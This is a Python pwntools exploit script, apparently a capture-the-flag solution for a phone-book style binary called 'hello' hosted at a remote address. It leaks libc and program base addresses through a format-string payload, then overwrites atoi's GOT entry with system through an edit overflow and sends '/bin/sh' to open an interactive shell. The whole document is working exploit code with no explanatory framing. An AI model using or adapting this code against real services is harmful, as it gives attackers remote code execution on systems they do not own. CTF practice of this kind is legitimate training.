from pwn import *
import warnings
warnings.filterwarnings("ignore")

context(arch='amd64', os='linux', log_level='debug')
#io = process("./hello")
io = remote("61.147.171.103", 64782)
elf = ELF("./hello")
libc = ELF("./libc-2.23.so")

def debug():
    gdb.attach(io)
    pause()

def add(phone, name, size, info):
    io.sendlineafter("your choice>>", "1")
    io.sendlineafter('number:', phone)
    io.sendlineafter('name:', name)
    io.sendlineafter('size:', size)
    io.sendlineafter('info:', info)

def edit(index,phone,name,info):
    io.sendlineafter('choice>>','4')
    io.sendlineafter('index:',index)
    io.sendlineafter('number:',phone)
    io.sendlineafter('name:',name)
    io.sendlineafter('info:',info)

def show(index):
    io.sendlineafter('choice>>','3')
    io.sendlineafter('index:',index)


#泄露libc和程序基地址
add(b'%13$p%9$p',b'aaaaaaaa',b'15',b'12345678')
show("0")
io.recvuntil("0x")
libc_start_main = int(io.recv(12), 16) - 240
libc_base = libc_start_main - libc.symbols['__libc_start_main']
io.recvuntil("0x")
elf_base = int(io.recv(12), 16) - 0x1274
success("libc_base ->" + hex(libc_base))
success("elf_base->" + hex(elf_base))

system_addr = libc_base + libc.symbols['system']
atoi_addr = elf_base + elf.got['atoi']

edit("0", b'c'*11, b'd'*13 + p64(atoi_addr), p64(system_addr))
io.sendlineafter(">>", b"/bin/sh")
io.interactive()